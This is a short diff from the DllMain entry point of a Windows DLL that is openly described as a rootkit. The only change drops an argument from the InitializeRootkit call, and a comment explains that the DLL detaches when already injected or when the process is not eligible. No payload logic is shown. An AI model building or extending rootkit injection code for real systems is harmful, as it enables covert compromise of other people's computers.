@@ -6,7 +6,7 @@ BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserv
 {
 	if (reason == DLL_PROCESS_ATTACH)
 	{
-		if (!InitializeRootkit(module))
+		if (!InitializeRootkit())
 		{
 			// If the rootkit could not initialize, is already injected, or not eligible for this process, detach the DLL.
 			return FALSE;
